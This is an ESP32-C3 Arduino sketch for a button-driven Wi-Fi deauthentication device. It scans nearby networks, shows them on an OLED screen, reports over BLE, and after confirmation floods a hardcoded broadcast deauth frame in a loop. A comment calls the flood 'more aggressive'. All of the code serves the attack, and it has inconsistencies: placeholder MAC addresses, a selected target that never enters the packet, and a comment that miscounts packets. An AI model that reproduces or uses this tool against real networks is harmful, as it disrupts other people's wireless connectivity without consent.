#include <WiFi.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "esp_wifi.h"
#include <NimBLEDevice.h>
#include "image_list.h"  // Ensure this header file contains the deauth image data

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64

// GPIO pins
#define SPEAKER_PIN 3
#define BUTTON_RETURN 9
#define BUTTON_ENTER 10
#define BUTTON_DOWN 20
#define BUTTON_UP 21
#define OLED_SDA 6
#define OLED_SCL 7

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

int selectedNetwork = 0;
bool attackMode = false;
uint8_t numNetworks = 0;
String networks[20];  // Array to store detected networks

const uint8_t deauth_packet[] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
  0x00, 0x00, 0xc0, 0x00, 0x3a, 0x01,
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xf0, 0xff, 0x02, 0x00
};

// BLE service and characteristics UUIDs
#define SERVICE_UUID        "6E400001-B5A3-F393-E0A9-E50E24DCCA9E"
#define CHARACTERISTIC_UUID "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"

NimBLEServer* pServer = nullptr;
NimBLECharacteristic* pTxCharacteristic;
bool deviceConnected = false;
bool oldDeviceConnected = false;

// Debounce timing
unsigned long lastButtonPress = 0;
const unsigned long debounceDelay = 300; // 300ms debounce delay

// Function declarations
void scanNetworks();
void displayNetworks();
void confirmAttack();
void beginAttack();
void displayAttackResults(bool success, int packetsSent, unsigned long duration); // Declare the function here

bool isButtonPressed(int pin) {
  if (digitalRead(pin) == LOW) {
    if (millis() - lastButtonPress > debounceDelay) {
      lastButtonPress = millis();
      return true;
    }
  }
  return false;
}

void setup() {
  pinMode(BUTTON_RETURN, INPUT_PULLUP);
  pinMode(BUTTON_ENTER, INPUT_PULLUP);
  pinMode(BUTTON_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_UP, INPUT_PULLUP);

  Serial.begin(115200);  // Initialize the serial for debugging

  // Initialize the OLED display
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    while (true);  // Hang in error state
  }

  // Display the deauth image until "Enter" is pressed
  display.clearDisplay();
  display.drawBitmap(0, 0, deauthImage, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.display();

  while (!isButtonPressed(BUTTON_ENTER)) {
    delay(10);  // Wait until the Enter button is pressed
  }

  // Initialize Wi-Fi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);  // Disconnect from any previous connections
  delay(100);

  // Initialize BLE
  NimBLEDevice::init("ESP32-C3-Deauther");
  pServer = NimBLEDevice::createServer();
  
  NimBLEService *pService = pServer->createService(SERVICE_UUID);
  pTxCharacteristic = pService->createCharacteristic(
                      CHARACTERISTIC_UUID,
                      NIMBLE_PROPERTY::NOTIFY
                    );

  pService->start();

  NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
  pAdvertising->addServiceUUID(SERVICE_UUID);
  pAdvertising->start();

  // Start scanning for networks
  scanNetworks();
}

void loop() {
  // Main loop doesn't need to do much, everything is handled in display or attack functions
}

void scanNetworks() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0, 0);
  display.println(F("Scanning..."));
  display.display();

  Serial.println("Starting Wi-Fi scan...");  // Debug output

  // Start Wi-Fi scan with a timeout
  int scanTimeout = 5000; // 5 seconds timeout
  unsigned long startTime = millis();
  numNetworks = WiFi.scanNetworks();

  while (numNetworks == 0 && (millis() - startTime) < scanTimeout) {
    delay(500); // Allow time for scanning
    numNetworks = WiFi.scanNetworks();
  }

  if (numNetworks == 0) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println(F("No networks found."));
    display.display();
    delay(2000);
    scanNetworks();  // Retry scanning
  } else {
    for (int i = 0; i < numNetworks; i++) {
      networks[i] = WiFi.SSID(i);
      if (deviceConnected) {
        pTxCharacteristic->setValue(networks[i].c_str());
        pTxCharacteristic->notify();
      }
    }
    displayNetworks();  // Display the found networks
  }
}

void displayNetworks() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);

  int start = max(0, selectedNetwork - 2);
  for (int i = start; i < min(start + 5, (int)numNetworks); i++) {  // Cast numNetworks to int
    if (i == selectedNetwork) {
      display.setTextColor(BLACK, WHITE);  // Inverse color
    } else {
      display.setTextColor(WHITE);
    }
    display.setCursor(0, (i - start) * 10);
    display.println(networks[i]);
  }

  display.display();

  // Navigate through the network list
  while (true) {
    if (isButtonPressed(BUTTON_DOWN)) {
      selectedNetwork = (selectedNetwork + 1) % numNetworks;
      displayNetworks();
    } else if (isButtonPressed(BUTTON_UP)) {
      selectedNetwork = (selectedNetwork - 1 + numNetworks) % numNetworks;
      displayNetworks();
    } else if (isButtonPressed(BUTTON_ENTER)) {
      confirmAttack();
      break;
    }
  }
}

void confirmAttack() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(0, 0);
  display.println(F("Press Enter to start attack"));
  display.display();

  // Wait for the user to confirm by pressing "Enter"
  while (true) {
    if (isButtonPressed(BUTTON_ENTER)) {
      beginAttack();
      break;
    } else if (isButtonPressed(BUTTON_RETURN)) {
      displayNetworks();  // Return to the network selection
      break;
    }
  }
}

void beginAttack() {
    unsigned long attackStartTime = millis();
    int packetsSent = 0;
    bool attackSuccess = true;

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 0);
    display.println(F("Attacking..."));
    display.display();

    if (deviceConnected) {
        pTxCharacteristic->setValue("Deauth attack started...");
        pTxCharacteristic->notify();
    }

    // Increase packet sending rate to make the attack more aggressive
    while (digitalRead(BUTTON_RETURN) == HIGH) {
        for (int i = 0; i < 50; i++) {  // Send 10 packets per loop iteration
            if (!esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false)) {
                attackSuccess = false;
                break;  // Stop if there's an error sending packets
            }
            packetsSent++;
        }

        // Update the display with the current packet count
        display.clearDisplay();
        display.setTextSize(1);
        display.setTextColor(WHITE);
        display.setCursor(0, 0);
        display.println(F("Attacking..."));
        display.printf("Packets sent: %d\n", packetsSent);
        display.display();

        delay(10);  // Adjust delay if necessary
    }

    unsigned long attackEndTime = millis();
    unsigned long attackDuration = (attackEndTime - attackStartTime) / 1000;  // Convert to seconds

    displayAttackResults(attackSuccess, packetsSent, attackDuration);
}



void displayAttackResults(bool success, int packetsSent, unsigned long duration) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);

  if (success) {
    display.println(F("Attack successful!"));
  } else {
    display.println(F("Attack failed."));
  }

  display.printf("Packets sent: %d\n", packetsSent);
  display.printf("Duration: %lus\n", duration);
  display.display();

  delay(5000);  // Display results for 5 seconds before returning
  displayNetworks();
}
